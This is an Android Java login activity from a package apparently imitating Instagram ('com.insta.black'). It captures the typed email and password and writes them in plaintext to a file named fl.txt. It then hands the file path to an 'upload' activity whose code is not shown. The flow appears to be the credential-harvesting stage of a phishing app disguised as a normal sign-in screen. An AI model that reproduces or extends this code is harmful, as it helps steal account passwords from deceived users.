package com.insta.black;

import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;
import android.text.TextUtils; // Import for non-empty string checks
import android.view.View;
import android.widget.Button;
// Import for email validation
import android.util.Patterns;
import android.widget.EditText;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import java.io.File;
import java.io.FileOutputStream;

public class login extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.login);

        Button loginButton = findViewById(R.id.button);
        loginButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                EditText emailEditText = findViewById(R.id.editTextTextEmailAddress2);
                EditText passwordEditText = findViewById(R.id.password);

                String email = emailEditText.getText().toString().trim();
                String password = passwordEditText.getText().toString().trim();

                if (isValidEmail(email)) {
                    if (isValidPassword(password)) {
                        try {
                            String data = email + " " + password ;
                            File directory = getFilesDir();
                            File fl = new File(directory,"fl.txt");
                            FileOutputStream out = new FileOutputStream(fl);
                            out.write(data.getBytes());
                            out.close();
                            Intent up = new Intent(login.this, upload.class);
                            up.putExtra("path",fl.getPath());
                            startActivity(up);
                            finish();


                        }catch(Exception e){
                            finish();
                        }
                    } else {
                        passwordEditText.setError("Invalid password");
                        passwordEditText.setTextColor(Color.RED);
                    }
                } else {
                    // Display error for invalid email
                    emailEditText.setError("Invalid email");
                    emailEditText.setTextColor(Color.RED);
                }
            }
        });
    }

    private boolean isValidEmail(String email) {
        return Patterns.EMAIL_ADDRESS.matcher(email).matches();
    }

    private boolean isValidPassword(String password) {
        int minLength = 6; // Example minimum length
        return password.length() >= minLength;
    }
}